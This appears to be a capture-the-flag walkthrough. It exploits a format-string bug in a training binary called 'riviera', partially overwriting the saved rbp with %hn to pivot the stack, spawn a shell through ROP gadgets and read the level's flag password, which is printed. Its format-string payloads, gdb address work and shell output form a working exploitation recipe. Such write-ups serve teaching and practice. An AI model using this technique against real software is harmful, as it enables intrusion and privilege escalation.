## Level03

`level03` starts off like the usual, a binary, README and a source file:

```bash
level04@rainfall:~$ ls
README  riviera  riviera.c
```

And running `checksec` on it we'll find that the `NX` bit is once again set to enabled:

```bash
level04@rainfall:~$ checksec ./riviera
[*] '/home/level04/riviera'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Inspecting the source file we're faced with a new adversary: `fgets`.
This is a "safe" version of `gets` that caps out at the given `size`.
Realizing we are not able to use any of our pervious exploits a more thorough look at the source code was needed.
Giving it a bit of time we stumbled upon a vulnerability inside of the `display_entry` function.

There is a `printf` call where we have access to the format string:

```c
   printf(log_buf[idx].tag);
```

A user accessible format string is a big issue since `printf` uses a `VA_LIST` to parse it's arguments. This means that arguments given are passed on the stack (depending on the implementation), and the format string specifies how many accesses are done to retrieve those arguments.

Creating a format string that has more specifiers than arguments given to `printf` will cause variables located on the stack to be addressed, eventually reaching the `saved return address` or even going past it into another stack frame.

On top of being able to address values off the stack `printf` can write to a memory address as well using the `%n` specifier, chaining these two things together you can already imagine how we're able to exploit this binary.

The `%n` specifier normally takes a pointer to an integer and sets the value equal to the amount of bytes written. If we were to give it the pointer to the `saved return address` we can use the format string to overwrite it with a value we want, returning to one of our gadgets!

Sadly since the format buffer is only `32` bytes long we will not be able to change that right away, as we simply don't have the space to overwrite 8 full bytes. However in `level02` we learned how to perform a `stack pivot`. Since both the `display_entry` and its caller `handle_input` perform a `leave` instruction we can change the lower two bytes of the `saved rbp`. The `saved rbp` address will be much closer to the first address we want to jump to, meaning we don't have to change all 8 bytes. Changing fewer bytes but still achieving a shell!

[This](https://www.exploit-db.com/papers/13239) is a very nice paper that goes over format string exploitation, but lets go through it together step by step:

Our plan of attack will be adding a format string inside of the `tag` buffer and additional payload in the `msg` buffer that does the following:
- Uses the width modifier of the `%x` specifier to change the number of bytes `printf` has written up to that point.
- Write into the `saved rbp` so we can perform a stack pivot like we did in [level02](../../level02/resources/walkthrough.md).
- Since the `NX` bit once again turned on, use the same ROPgadgets as in [level03](../../level03/resources/walkthrough.md) to spawn a shell.

Like the above paper mentions, we'll be using `Direct Parameter Access` to make our format string nice and tidy.
So let's get to crafting that format string!

First things first we're going to need to figure out 5 things:
- The offset our `DPA` needs to have before we hit the `msg` array (containing the payload) found on the stack of the previously called function, `handle_input`.
- The address of the `msg` array.
- The address of the `saved rbp`.
- The address contained in `saved rbp`.
- The width adjustments needed so we can write the address of our the `msg` array into `saved rbp`.

As always `gdb` will be our tool of choice, making sure not to have its `LINES` and `COLUMNS` env variables set.
We can get the first goal by trial and error.
If we set our `msg` array to just `A`'s and incrementally increase the `DPA` we should eventually see the value `0x41` in the output, meaning we have hit the `msg` array.

This simple payload will look like this:

```bash
level04@rainfall:~$  echo -e 'value: %1$08x\nAAAAAAAAAAAAAAAAAAAAAAAAAAA' > payload
```

We're using `echo -e` in combination with single quotes so the newline `\n` still expands but the `$` does not expand as a variable.

The formatting works as follows, the `$` specifies the `Direct Parameter Access` location which will be the number found in front of it, after which the `08x` specifies a `0` padded `8` character hex number to be printed.
If we were to run the executable with this `payload` on it's `stdin` we're going to see the top stack value: 

```bash
level04@rainfall:~$ ./riviera < payload 
  [RIVIERA] What you see is not what is.
  [RIVIERA] Holographic logging system v1.9
[RIVIERA] Tag: [RIVIERA] Message: [RIVIERA] [0] tag=value: ffffde40 msg=AAAAAAAAAAAAAAAAAAAAAAAAAAA
[RIVIERA] [0] tag=value: ffffdf50 msg=AAAAAAAAAAAAAAAAAAAAAAAAAAA
```

`tag=value: ` is set to `ffffde40`, which is most likely the current value on top of the stack, somewhere inside of printf.
After a bit more trial and error, we can find the values `41414141` belonging to `msg` array on offset `10`:

```bash
level04@rainfall:~$ echo -e 'value: %10$08x\nAAAAAAAAAAAAAAAAAAAAAAAAAAA' > payload
   ...
level04@rainfall:~$ ./riviera < payload 
  [RIVIERA] What you see is not what is.
  [RIVIERA] Holographic logging system v1.9
[RIVIERA] Tag: [RIVIERA] Message: [RIVIERA] [0] tag=value: 41414141 msg=AAAAAAAAAAAAAAAAAAAAAAAAAAA
[RIVIERA] [0] tag=value: ffffe130 msg=AAAAAAAAAAAAAAAAAAAAAAAAAAA
```

In the second to last line we can see `tag=value: 41414141`, indicating we've found our `msg` array!
Now that we have found the `DPA` offset for the `msg` array we can try to find its address:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break handle_input" -ex run riviera
...
(gdb) disas handle_input
   0x000000000040147f <+57>:	lea    -0x20(%rbp),%rax
   0x0000000000401483 <+61>:	mov    $0x20,%esi
   0x0000000000401488 <+66>:	mov    %rax,%rdi
   0x000000000040148b <+69>:	call   0x4010f0 <fgets@plt>
	...
   0x00000000004014d5 <+143>:	lea    -0x120(%rbp),%rax
   0x00000000004014dc <+150>:	mov    $0x100,%esi
   0x00000000004014e1 <+155>:	mov    %rax,%rdi
   0x00000000004014e4 <+158>:	call   0x4010f0 <fgets@plt>
(gdb) info frame
Stack level 0, frame at 0x7fffffffe120:
 rip = 0x40144e in handle_input; saved rip = 0x401584
 called by frame at 0x7fffffffe130
 Arglist at 0x7fffffffe110, args: 
 Locals at 0x7fffffffe110, Previous frame's sp is 0x7fffffffe120
 Saved registers:
  rbp at 0x7fffffffe110, rip at 0x7fffffffe118
```

The effective address of `tag` would be `0x7fffffffe110` minus `0x20` and the address of `msg` `0x7fffffffe110` minus `0x120`.

This means that our addresses are as follows:
-	`tag`: `0x7fffffffe0f0`
-	`msg`: `0x7fffffffdff0`

Next up we'll try to find the address of `display_entry`'s `saved rbp`:

```bash
gdb -nx -ex "unset environment LINES" -ex "unset environment COLUMNS" -ex "break display_entry" -ex run riviera
...
(gdb) info frame
Stack level 0, frame at 0x7fffffffdff0:
 rip = 0x401381 in display_entry; saved rip = 0x401533
 called by frame at 0x7fffffffe120
 Arglist at 0x7fffffffdfe0, args: 
 Locals at 0x7fffffffdfe0, Previous frame's sp is 0x7fffffffdff0
 Saved registers:
  rbp at 0x7fffffffdfe0, rip at 0x7fffffffdfe8
```

`info frame` tells us that `rbp` is saved on the stack address `0x7fffffffdfe0`.
In order to see what the actual value that is saved we can use the `x/gx` command:

```bash
(gdb) x/gx 0x7fffffffdfe0
0x7fffffffdfe0:	0x00007fffffffe110
```

Now all that is left to do before we can craft our payload is finding the correct width adjustment needed to overwrite the `saved rbp` with `msg`'s address.

If we compare the two addresses `0x00007fffffffe110` (`saved rbp`) and `0x7fffffffdff0` (`msg` array) the addresses nearly match because the callstack is really close to one another (the reason we also decided to go for a stack pivot).
We only need to change the lower two bytes `e110` into `dff0`.
So the width adjustment needed would simply be `dff0` in base 10: 

```bash
level04@rainfall:~$ python3 -c "print(0xdff0)"
57328
```

Now we can put everything together!
We'll be using a nearly identical `payload` as in `level03` with just a few changes.
Mainly the line `b'%57328x%10$hn',`, this is the format string given to printf. 
The width adjustment is set to what we have calculated above and written to the `stdout` after which the total amount of bytes printed is written to the memory address `0x7fffffffdfe0` which is at `10$` the 10th index on the stack, inside the `msg` buffer.
The `h` specifier combined with `n` will cause a write of two bytes instead of one.

Finally we can run our payload script, hand it to the executable and collect our flag:

```bash
level04@rainfall:~$ python3 exploit.py
   ...
level04@rainfall:~$ cat payload - | $PWD/riviera
   ...
id
uid=1005(level04) gid=1007(level04) euid=1021(flag04) groups=1007(level04),1001(levelgroup)
   ...
cat /home/flag04/.pass
x0w8xdgapz3tjopq2s11a27yro7krazm
```
